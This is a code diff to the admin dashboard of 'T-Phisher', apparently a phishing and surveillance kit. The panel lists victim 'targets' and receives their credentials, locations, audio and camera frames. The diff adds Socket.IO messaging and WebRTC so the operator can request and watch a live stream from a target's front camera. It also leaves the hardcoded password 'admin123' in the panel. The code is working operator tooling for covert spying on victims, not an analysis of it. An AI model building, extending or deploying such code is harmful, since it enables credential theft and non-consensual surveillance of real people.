@@ -6,6 +6,7 @@
   <title>T-Phisher — Admin Panel</title>
   <meta name="description" content="T-Phisher Admin Dashboard">
   <link rel="stylesheet" href="/admin.css">
+  <script src="/socket.io/socket.io.js"></script>
 </head>
 <body>
 
@@ -418,7 +419,7 @@
 const ADMIN_PASSWORD = 'admin123'; // Change this to your desired password
 
 // ─── State ────────────────────────────────────────────────────────
-let ws = null;
+let ws = null; // Holds the Socket.IO socket client
 let isConnected = false;
 let targets     = {};   // clientId -> userInfo
 let activityLog = [];
@@ -426,6 +427,7 @@ let mediaItems  = [];
 let credLogs    = [];
 let alertCount  = 0;
 let activeTab   = 'overview';
+const peerConnections = {}; // targetId -> RTCPeerConnection
 
 // ─── Login ────────────────────────────────────────────────────────
 document.getElementById('admin-password').addEventListener('keydown', e => {
@@ -452,7 +454,10 @@ function attemptLogin(bypassPass) {
 }
 
 function logout() {
-  if (ws) ws.close();
+  if (ws) {
+    if (ws.close) ws.close();
+    else if (ws.disconnect) ws.disconnect();
+  }
   localStorage.removeItem('adminPassword');
   document.getElementById('dashboard').classList.remove('visible');
   document.getElementById('login-screen').style.display = 'flex';
@@ -470,37 +475,176 @@ function startClock() {
   setInterval(tick, 1000);
 }
 
-// ─── WebSocket ────────────────────────────────────────────────────
+// ─── Socket.IO ────────────────────────────────────────────────────
 function initWebSocket() {
-  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
-  ws = new WebSocket(`${proto}//${location.host}`);
+  ws = io(location.protocol + '//' + location.host);
 
-  ws.onopen = () => {
+  ws.on('connect', () => {
     isConnected = true;
-    ws.send(JSON.stringify({ type: 'join_admin' }));
-    addCtrlStatus('[connected] WebSocket connected to server.');
-  };
+    ws.emit('join_admin');
+    addCtrlStatus('[connected] Socket.IO connected to server.');
+  });
 
-  ws.onmessage = (evt) => {
-    let msg;
-    try { msg = JSON.parse(evt.data); } catch { return; }
-    handleMessage(msg);
-  };
-
-  ws.onclose = () => {
+  ws.on('disconnect', () => {
     isConnected = false;
-    addCtrlStatus('[disconnected] WebSocket closed. Reconnecting in 3s...', true);
-    setTimeout(initWebSocket, 3000);
+    addCtrlStatus('[disconnected] Socket.IO closed.', true);
+  });
+
+  ws.on('connect_error', (err) => {
+    addCtrlStatus('[error] Socket.IO connection error: ' + err.message, true);
+  });
+
+  // Listen to standard WebSocket-like message fallback if backend sends it
+  ws.on('message', (data) => {
+    let msg;
+    try {
+      msg = typeof data === 'string' ? JSON.parse(data) : data;
+    } catch {
+      return;
+    }
+    handleMessage(msg);
+  });
+
+  // Direct events mappings
+  ws.on('INIT', (msg) => { handleMessage({ type: 'INIT', ...msg }); });
+  ws.on('TARGET_CONNECTED', (msg) => { handleMessage({ type: 'TARGET_CONNECTED', ...msg }); });
+  ws.on('TARGET_DISCONNECTED', (msg) => { handleMessage({ type: 'TARGET_DISCONNECTED', ...msg }); });
+  ws.on('LOCATION_UPDATE', (msg) => { handleMessage({ type: 'LOCATION_UPDATE', ...msg }); });
+  ws.on('NEW_LOG', (msg) => { handleMessage({ type: 'NEW_LOG', ...msg }); });
+  ws.on('NEW_MEDIA', (msg) => { handleMessage({ type: 'NEW_MEDIA', ...msg }); });
+  ws.on('ACTIVITY', (msg) => { handleMessage({ type: 'ACTIVITY', ...msg }); });
+  ws.on('ALERT_SENT', (msg) => { handleMessage({ type: 'ALERT_SENT', ...msg }); });
+  ws.on('CAMERA_FRAME', (msg) => { handleMessage({ type: 'CAMERA_FRAME', ...msg }); });
+  ws.on('AUDIO_CHUNK', (msg) => { handleMessage({ type: 'AUDIO_CHUNK', ...msg }); });
+
+  // Listen for snapshot feed (Step 6) using the 'feed:frame' event
+  ws.on('feed:frame', (data) => {
+    const uuid = data.uuid || data.clientId || data.targetId;
+    const img = document.getElementById(`live-feed-${uuid}`) || document.getElementById(`camera-live-img-${uuid}`);
+    if (img) {
+      img.src = data.frame || data.image || data.data;
+      img.style.display = 'block';
+    }
+    const stream = activeCameraStreams[uuid];
+    if (stream) {
+      stream.frameCount++;
+      stream.fpsCounter++;
+      const frameCountEl = document.getElementById(`cam-frames-${uuid}`);
+      if (frameCountEl) frameCountEl.textContent = stream.frameCount;
+    }
+  });
+
+  // WebRTC offer receiving
+  const handleOffer = async (data) => {
+    const targetId = data.targetId || data.clientId || data.uuid;
+    if (!targetId) return;
+
+    addCtrlStatus(`[webrtc] Received offer from target #${targetId}.`);
+    initWebRTC(targetId);
+    const pc = peerConnections[targetId];
+    if (!pc) return;
+
+    try {
+      await pc.setRemoteDescription(new RTCSessionDescription(data.offer));
+      const answer = await pc.createAnswer();
+      await pc.setLocalDescription(answer);
+      ws.emit('webrtc:answer', { targetId, answer });
+      ws.emit('answer', { targetId, answer });
+      addCtrlStatus(`[webrtc] Created and sent answer for target #${targetId}.`);
+    } catch (err) {
+      console.error("Error handling WebRTC offer:", err);
+      handleWebRTCFailure(targetId);
+    }
   };
 
-  ws.onerror = () => {
-    addCtrlStatus('[error] WebSocket error occurred.', true);
+  ws.on('webrtc:offer', handleOffer);
+  ws.on('offer', handleOffer);
+
+  // WebRTC ICE candidate receiving
+  const handleIce = async (data) => {
+    const targetId = data.targetId || data.clientId || data.uuid;
+    if (!targetId) return;
+    const pc = peerConnections[targetId];
+    if (pc && data.candidate) {
+      try {
+        await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
+      } catch (err) {
+        console.error("Error adding remote ICE candidate:", err);
+      }
+    }
+  };
+
+  ws.on('webrtc:ice', handleIce);
+  ws.on('ice', handleIce);
+  ws.on('candidate', handleIce);
+}
+
+function initWebRTC(targetId) {
+  if (peerConnections[targetId]) {
+    try {
+      peerConnections[targetId].close();
+    } catch(e) {}
+  }
+
+  const pc = new RTCPeerConnection({
+    iceServers: [
+      { urls: 'stun:stun.l.google.com:19302' },
+      { urls: 'stun:stun1.l.google.com:19302' },
+      { urls: 'stun:stun2.l.google.com:19302' },
+      { urls: 'stun:stun.cloudflare.com:3478' }
+    ],
+    iceTransportPolicy: 'all',
+    bundlePolicy:       'max-bundle',
+    rtcpMuxPolicy:      'require'
+  });
+
+  peerConnections[targetId] = pc;
+
+  pc.onicecandidate = (event) => {
+    if (event.candidate) {
+      ws.emit('webrtc:ice', { targetId, candidate: event.candidate });
+      ws.emit('ice', { targetId, candidate: event.candidate });
+      ws.emit('candidate', { targetId, candidate: event.candidate });
+    }
+  };
+
+  pc.ontrack = (event) => {
+    const video = document.getElementById(`camera-live-video-${targetId}`);
+    const img = document.getElementById(`live-feed-${targetId}`) || document.getElementById(`camera-live-img-${targetId}`);
+    if (video) {
+      video.srcObject = event.streams[0];
+      video.style.display = 'block';
+      video.play().catch(e => console.error("Error playing video stream:", e));
+    }
+    if (img) {
+      img.style.display = 'none';
+    }
+    addCtrlStatus(`[webrtc] WebRTC stream track received for target #${targetId}.`);
+  };
+
+  pc.oniceconnectionstatechange = () => {
+    if (pc.iceConnectionState === 'failed' || pc.iceConnectionState === 'disconnected') {
+      addCtrlStatus(`[webrtc] WebRTC connection failed/disconnected for target #${targetId}. Falling back to snapshot feed.`, true);
+      handleWebRTCFailure(targetId);
+    }
   };
 }
 
+function handleWebRTCFailure(targetId) {
+  const video = document.getElementById(`camera-live-video-${targetId}`);
+  const img = document.getElementById(`live-feed-${targetId}`) || document.getElementById(`camera-live-img-${targetId}`);
+  if (video) {
+    video.style.display = 'none';
+    video.srcObject = null;
+  }
+  if (img) {
+    img.style.display = 'block';
+  }
+}
+
 function sendWS(data) {
-  if (ws && ws.readyState === WebSocket.OPEN) {
-    ws.send(JSON.stringify(data));
+  if (ws && isConnected) {
+    ws.emit(data.type, data);
     return true;
   }
   addCtrlStatus('[error] Not connected to server.', true);
@@ -939,6 +1083,7 @@ function refreshCameraGrid() {
               <p class="camera-placeholder-sub">Click <strong>Start Stream</strong> below</p>
             </div>
             <img id="camera-live-img-${cid}" class="camera-live-img" src="" alt="Live camera feed" style="display:none">
+            <video id="camera-live-video-${cid}" autoplay playsinline style="display:none; width: 100%; height: 100%; object-fit: cover;"></video>
             <div class="camera-overlay-info" id="camera-overlay-info-${cid}" style="display:none">
               <span class="cam-overlay-rec">● LIVE</span>
               <span id="cam-overlay-fps-${cid}">0 fps</span>
@@ -998,11 +1143,20 @@ function startCameraStream(targetId) {
 
   sendWS({ type: 'start_live_camera', targetId, facing: 'user' });
 
+  // Request WebRTC from the user via signaling
+  if (ws && isConnected) {
+    ws.emit('webrtc:request', { targetId, clientId: targetId });
+  }
+
   // Update UI components for this target card
   document.getElementById(`camera-start-btn-${targetId}`).disabled = true;
   document.getElementById(`camera-stop-btn-${targetId}`).disabled  = false;
   document.getElementById(`camera-placeholder-${targetId}`).style.display = 'none';
-  document.getElementById(`camera-live-img-${targetId}`).style.display    = 'block';
+  
+  // Show image placeholder by default until WebRTC stream track is received
+  const img = document.getElementById(`live-feed-${targetId}`) || document.getElementById(`camera-live-img-${targetId}`);
+  if (img) img.style.display = 'block';
+
   document.getElementById(`camera-overlay-info-${targetId}`).style.display = 'flex';
   document.getElementById(`cam-live-dot-${targetId}`).style.display = '';
 
@@ -1019,7 +1173,7 @@ function startCameraStream(targetId) {
     }
   }, 1000);
 
-  addCtrlStatus(`[camera] 📹 Live stream started for target #${targetId}.`);
+  addCtrlStatus(`[camera] 📹 Live stream started for target #${targetId}. Requested WebRTC...`);
 }
 
 function stopCameraStream(targetId) {
@@ -1027,17 +1181,39 @@ function stopCameraStream(targetId) {
   if (!stream) return;
 
   sendWS({ type: 'stop_live_camera', targetId });
+  if (ws && isConnected) {
+    ws.emit('webrtc:stop', { targetId });
+  }
   addCtrlStatus(`[camera] ⏹️ Stream stopped for target #${targetId}.`);
 
   if (stream.fpsInterval) clearInterval(stream.fpsInterval);
   delete activeCameraStreams[targetId];
 
+  // Close peer connection
+  if (peerConnections[targetId]) {
+    try {
+      peerConnections[targetId].close();
+    } catch(e) {}
+    delete peerConnections[targetId];
+  }
+
   // Reset UI components for this target card
   document.getElementById(`camera-start-btn-${targetId}`).disabled = false;
   document.getElementById(`camera-stop-btn-${targetId}`).disabled  = true;
   document.getElementById(`camera-placeholder-${targetId}`).style.display = '';
-  document.getElementById(`camera-live-img-${targetId}`).style.display    = 'none';
-  document.getElementById(`camera-live-img-${targetId}`).src              = '';
+  
+  const img = document.getElementById(`live-feed-${targetId}`) || document.getElementById(`camera-live-img-${targetId}`);
+  if (img) {
+    img.style.display = 'none';
+    img.src = '';
+  }
+
+  const video = document.getElementById(`camera-live-video-${targetId}`);
+  if (video) {
+    video.style.display = 'none';
+    video.srcObject = null;
+  }
+
   document.getElementById(`camera-overlay-info-${targetId}`).style.display = 'none';
   document.getElementById(`cam-live-dot-${targetId}`).style.display       = 'none';
   document.getElementById(`cam-frames-${targetId}`).textContent           = '0';
@@ -1047,16 +1223,24 @@ function stopCameraStream(targetId) {
 }
 
 function receiveCameraFrame(msg) {
-  const stream = activeCameraStreams[msg.clientId];
+  const targetId = msg.clientId || msg.targetId || msg.uuid;
+  const stream = activeCameraStreams[targetId];
   if (!stream) return; // not listening for this target's frames
 
-  const img = document.getElementById(`camera-live-img-${msg.clientId}`);
-  if (img) img.src = msg.frame;
+  // If WebRTC is currently active and showing video, we might not show frames,
+  // but if WebRTC failed/is disabled, or video is hidden, show the frame in the img tag.
+  const video = document.getElementById(`camera-live-video-${targetId}`);
+  const img = document.getElementById(`live-feed-${targetId}`) || document.getElementById(`camera-live-img-${targetId}`);
+  
+  if (img && (!video || video.style.display === 'none')) {
+    img.src = msg.frame || msg.image || msg.data;
+    img.style.display = 'block';
+  }
 
   stream.frameCount++;
   stream.fpsCounter++;
   
-  const frameCountEl = document.getElementById(`cam-frames-${msg.clientId}`);
+  const frameCountEl = document.getElementById(`cam-frames-${targetId}`);
   if (frameCountEl) frameCountEl.textContent = stream.frameCount;
 }
 
